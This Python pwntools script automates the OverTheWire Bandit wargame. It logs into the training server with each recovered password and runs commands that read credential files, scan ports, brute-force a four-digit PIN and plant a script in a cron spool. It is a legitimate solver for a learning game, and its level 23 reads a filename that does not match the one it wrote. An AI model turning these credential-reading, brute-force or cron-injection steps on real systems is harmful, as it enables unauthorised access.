
# suppress annoying warnings
import warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

# import pwnlib
from pwn import ssh

# password cache
from passcache import PasswordCache

# logging lib
from logzero import logger, loglevel

# import regex lib
import re

# threading
from codecs import encode

MAX_WORKERS = 10

# functions
def info(msg):
    logger.info(msg)
    print()

def clean_password(password):
    return password.decode('utf8').strip()

def get_shell(options):
    return options.get('shell')

def get_levelpass(options):
    return options.get('level_pass')

def start_interactive(options):
    return get_shell(options).interactive()

def start_sh(options, cmd='sh'):
    return get_shell(options).run(cmd)

def level24_func(password):
    return password

# Bandit Class
class Bandit(object):
    URL = 'bandit.labs.overthewire.org'
    PORT = 2220

    @staticmethod
    def run():
        passcache = PasswordCache('./bandit.json')

        max_level = 34

        last_pass = 'bandit0'

        hack_level = 0

        for level in range(1, (max_level+1)):
            hack_level = (level - 1)

            try:
                hack_func = getattr(Bandit, 'level%s' % hack_level)
            except AttributeError:
                break

            ssh_pass = passcache.get('level%s' % level)

            if ssh_pass:
                last_pass = ssh_pass
                continue

            if not last_pass:
                raise Exception('No password for level %s' % hack_level)

            info('Hacking level%s..' % hack_level)

            if 'RSA PRIVATE KEY' in last_pass:
                keyfile = 'bandit%s.rsa' % hack_level
                with open(keyfile, 'w') as filehandle:
                    filehandle.write(last_pass)
                    filehandle.close()

                shell = ssh(
                    'bandit%s' % hack_level,
                    host=Bandit.URL,
                    port=Bandit.PORT,
                    keyfile=keyfile
                )
            else:
                shell = ssh(
                    'bandit%s' % hack_level,
                    host=Bandit.URL,
                    port=Bandit.PORT,
                    password=last_pass
                )

            options = {
                "shell": shell,
                "level_pass": last_pass
            }

            new_ssh_pass = hack_func(options)

            shell.close()

            if new_ssh_pass:
                info('Found level%s password: %s' % (level, new_ssh_pass))
                passcache.write_pass('level%s' % level, new_ssh_pass)
                last_pass = new_ssh_pass
            else:
                last_pass = None
                break

        if level < max_level:
            info('Highest level reached: %s / %s' % (hack_level, max_level))
        else:
            info('DONE!')

    @staticmethod
    def level0(options):
        level1_password = None

        # wait for prompt
        sh = get_shell(options).run('sh')
        sh.recvuntil('$ ', timeout=3)

        # get the password
        sh.sendline('cat readme')
        level1_password = sh.recvline().decode('utf8').strip()

        # close the shell
        sh.close()

        return level1_password

    @staticmethod
    def level1(options):
        (res, exit_code) = get_shell(options).run_to_end('cat ./-')
        return clean_password(res)

    @staticmethod
    def level2(options):
        (res, exit_code) = get_shell(options).run_to_end('cat ./spaces\ in\ this\ filename')
        return clean_password(res)

    @staticmethod
    def level3(options):
        (res, exit_code) = get_shell(options).run_to_end('cat ./inhere/.hidden')
        return clean_password(res)

    @staticmethod
    def level4(options):
        (res, exit_code) = get_shell(options).run_to_end('find ./inhere -type f -exec egrep -o "^\w{32}$" "{}" \;')
        return clean_password(res)

    @staticmethod
    def level5(options):
        (res, exit_code) = get_shell(options).run_to_end('find ./inhere -type f -exec egrep -o "^\w{32}$" "{}" \;')
        return clean_password(res)

    @staticmethod
    def level6(options):
        (res, exit_code) = get_shell(options).run_to_end('cat $(find / -user bandit7 -group bandit6 -size 33c 2>/dev/null)')
        return clean_password(res)

    @staticmethod
    def level7(options):
        (res, exit_code) = get_shell(options).run_to_end('cat ./data.txt | grep millionth | egrep -o "\w{32}"')
        return clean_password(res)

    @staticmethod
    def level8(options):
        (res, exit_code) = get_shell(options).run_to_end('sort data.txt | uniq -u')
        return clean_password(res)

    @staticmethod
    def level9(options):
        (res, exit_code) = get_shell(options).run_to_end('strings data.txt | grep === | egrep -o "\w{32}"')
        return clean_password(res)

    @staticmethod
    def level10(options):
        (res, exit_code) = get_shell(options).run_to_end('cat data.txt | base64 -d | egrep -o "\w{32}"')
        return clean_password(res)

    @staticmethod
    def level11(options):
        (res, exit_code) = get_shell(options).run_to_end('python -c "print(open(\'./data.txt\').read().decode(\'rot13\'))" | egrep -o "\w{32}"')
        return clean_password(res)

    @staticmethod
    def level12(options):
        level13_password = None

        # wait for prompt
        sh = get_shell(options).run('sh')
        sh.recvuntil('$ ', timeout=3)

        # get the password
        folder = '/tmp/hellobye123'

        sh.sendline('mkdir -p %s' % folder)
        sh.sendline('cd %s' % folder)
        sh.sendline('cp ~/data.txt ./data.bin.orig')
        sh.sendline('xxd -r ./data.bin.orig > data.bin')

        sh.recvuntil('$ ', timeout=3)

        while True:
            sh.sendline('file ./data.bin')
            filetype = sh.recvline().decode('utf8').strip()
            sh.recvuntil('$ ')

            if 'gzip compressed data' in filetype:
                sh.sendline('mv ./data.bin ./data.bin.gz')
                sh.sendline('gunzip ./data.bin.gz')
            elif 'bzip2 compressed data' in filetype:
                sh.sendline('mv ./data.bin ./data.bin.bz2')
                sh.sendline('bunzip2 ./data.bin.bz2')
            elif 'POSIX tar' in filetype:
                sh.sendline('mv ./data.bin ./data.bin.tar')
                sh.recvuntil('$ ')
                sh.sendline('tar xvf ./data.bin.tar')
                new_file = sh.recvline().decode('utf8').strip()
                sh.sendline('mv %s ./data.bin' % new_file)
            elif 'ASCII text' in filetype:
                # get the password
                sh.sendline('cat ./data.bin | egrep -o "\w{32}"')
                level13_password = clean_password(sh.recvline())
                break

        # close the shell
        sh.close()

        return level13_password

    @staticmethod
    def level13(options):
        (res, exit_code) = get_shell(options).run_to_end('ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -q -i sshkey.private -l bandit14 0 cat /etc/bandit_pass/bandit14')
        return clean_password(res)

    @staticmethod
    def level14(options):
        level15_password = None

        # wait for prompt
        sh = get_shell(options).run('sh')
        sh.recvuntil('$ ', timeout=3)


        # get the password
        cur_level_pass = get_levelpass(options)
        sh.sendline('echo "%s" | nc 0 30000 | egrep -o "\w{32}"' % cur_level_pass)
        level15_password = clean_password(sh.recvline())

        # close the shell
        sh.close()

        return level15_password

    @staticmethod
    def level15(options):
        level16_password = None

        # wait for prompt
        sh = get_shell(options).run('sh')
        sh.recvuntil('$ ', timeout=3)

        # get the password
        cur_level_pass = get_levelpass(options)
        sh.sendline('echo "%s" | openssl s_client -connect 0:30001 -quiet 2>/dev/null | egrep -o "\w{32}"' % cur_level_pass)
        level16_password = clean_password(sh.recvline())

        # close the shell
        sh.close()

        return level16_password

    @staticmethod
    def level16(options):
        level17_password = None

        # wait for prompt
        sh = get_shell(options).run('sh')
        sh.recvuntil('$ ', timeout=3)

        # find the ports to submit password on
        sh.sendline('nmap 0 -p 31000-32000 | tail -n+7 | awk "{print \$1}" | egrep -o "[0-9]+"')
        ports = sh.recvuntil('$ ').decode('utf8').replace('$ ', '').strip().split('\n')

        sh.close()

        cur_level_pass = get_levelpass(options)

        for port in ports:
            # try to get the password
            sh = get_shell(options).run('openssl s_client -connect 0:%s -quiet 2>/dev/null' % port)
            sh.sendline(cur_level_pass)
            result_str = sh.recvline().decode('utf8').strip()

            if result_str == 'Correct!':
                level17_password = clean_password(sh.recvuntil('END RSA PRIVATE KEY-----'))

            sh.close()

            if level17_password:
                break

        return level17_password

    @staticmethod
    def level17(options):
        (res, exit_code) = get_shell(options).run_to_end('diff passwords.old passwords.new | tail -1 | egrep -o "\w{32}"')
        return clean_password(res)

    @staticmethod
    def level18(options):
        (res, exit_code) = get_shell(options).run_to_end('cat ./readme')
        return clean_password(res)

    @staticmethod
    def level19(options):
        (res, exit_code) = get_shell(options).run_to_end('./bandit20-do cat /etc/bandit_pass/bandit20')
        return clean_password(res)

    @staticmethod
    def level20(options):
        level_pass = get_levelpass(options)
        sh = get_shell(options).run('echo -n "%s" | nc -l -p 3535' % level_pass)
        sh2 = get_shell(options).run('./suconnect 3535')

        res = sh.recvline()

        sh.close()
        sh2.close()

        return clean_password(res)

    @staticmethod
    def level21(options):
        sh = get_shell(options).run('sh')

        sh.recvuntil('$ ')
        sh.sendline('cat /usr/bin/cronjob_bandit22.sh | egrep -o "\w{32}" | head -1')

        filename = clean_password(sh.recvline())

        sh.recvuntil('$ ')
        sh.sendline('cat /tmp/%s' % filename)

        res = sh.recvline()

        sh.close()

        return clean_password(res)

    @staticmethod
    def level22(options):
        (res, exit_code) = get_shell(options).run_to_end('cat /tmp/$(echo I am user bandit23 | md5sum | cut -d " " -f 1)')

        return clean_password(res)

    @staticmethod
    def level23(options):
        sh = start_sh(options)

        sh.recvuntil('$ ')
        sh.sendline('echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass_abc12345" > /var/spool/bandit24/get_pass.sh; chmod +x /var/spool/bandit24/get_pass.sh')
        sh.recvuntil('$ ')
        sh.sendline('sleep 30')
        sh.recvuntil('$ ')
        sh.sendline('cat /tmp/bandit24_pass_abc1234')
        res = sh.recvline()

        sh.close()

        return clean_password(res)

    @staticmethod
    def level24(options):
        level24_pass = get_levelpass(options)

        sh = start_sh(options)

        folder = '/tmp/bandit25_getpass/'
        filename = 'out.txt'

        sh.recvuntil('$ ')
        sh.sendline('mkdir %s; for x in $(printf "%%04d\\n" $(seq 1 9999)); do echo "%s $x"; done > %s%s' % (
            folder,
            level24_pass,
            folder,
            filename
        ))
        sh.recvuntil('$ ')
        sh.sendline('ncat 127.0.0.1 30002 < %s%s | egrep -o "\w{32}"' % (
            folder, filename
        ))

        res = sh.recvline()

        sh.close()

        return clean_password(res)


    @staticmethod
    def level25(options):
        folder = "/tmp/mybandit25/"
        filename = "runme.sh"

        sh = start_sh(options)

        sh.recvuntil('$ ')
        sh.sendline(
            (
                'mkdir %s; '
                'echo "ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -q -i ~/bandit26.sshkey bandit26@0" > %s%s; '
                'chmod +x %s%s; '
                'cd %s'
            ) % (
                folder,
                folder, filename,
                folder, filename,
                folder
            )
        )
        sh.close()

        print((
            "======================================\n"
            "Make window small then run: %s%s\n"
            "When you see \"More %%..\" press 'v', then:\n"
            ":e /etc/bandit_pass/bandit26\n"
            "======================================"
        ) % (folder, filename))

        start_interactive(options)

        return input('Please enter the password for level26: ')

    @staticmethod
    def level26(options):
        start_interactive(options)

    @staticmethod
    def level27(options):
        start_interactive(options)

    @staticmethod
    def level28(options):
        start_interactive(options)

    @staticmethod
    def level29(options):
        start_interactive(options)

    @staticmethod
    def level30(options):
        start_interactive(options)

    @staticmethod
    def level31(options):
        start_interactive(options)

    @staticmethod
    def level32(options):
        start_interactive(options)

    @staticmethod
    def level33(options):
        start_interactive(options)

    @staticmethod
    def level34(options):
        start_interactive(options)
